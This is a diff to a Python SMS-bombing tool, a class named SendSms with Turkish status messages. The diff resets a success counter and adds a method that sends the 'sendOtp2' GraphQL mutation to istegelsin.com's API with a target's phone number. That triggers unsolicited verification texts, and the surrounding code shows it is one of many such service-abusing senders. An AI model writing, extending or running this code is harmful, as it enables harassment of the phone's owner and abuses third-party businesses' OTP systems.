@@ -3,10 +3,12 @@ from random import choice
 from string import ascii_lowercase
 from bs4 import BeautifulSoup
 from colorama import Fore, Style
+from json import dumps
 
 class SendSms():
     random_mail = ''.join(choice(ascii_lowercase) for i in range(20))
-    adet = 1
+    adet = 0
+    
     def __init__(self, phone):
         self.phone = phone
 
@@ -336,3 +338,17 @@ class SendSms():
             self.adet += 1
         else:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> eastpak.com.tr") 
+
+
+    #istegelsin.com--sms--zaman-2dk
+    def isteGelsin(self):
+        istegelsin = requests.post("https://prod.fasapi.net/", data=dumps({"query": "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
+                "variables": {
+                    "phoneNumber": "90"+self.phone
+                }
+            }))
+        if istegelsin.json()["data"]["sendOtp2"]["alreadySent"] == False:
+            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> istegelsin.com")
+            self.adet += 1
+        else:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> istegelsin.com")
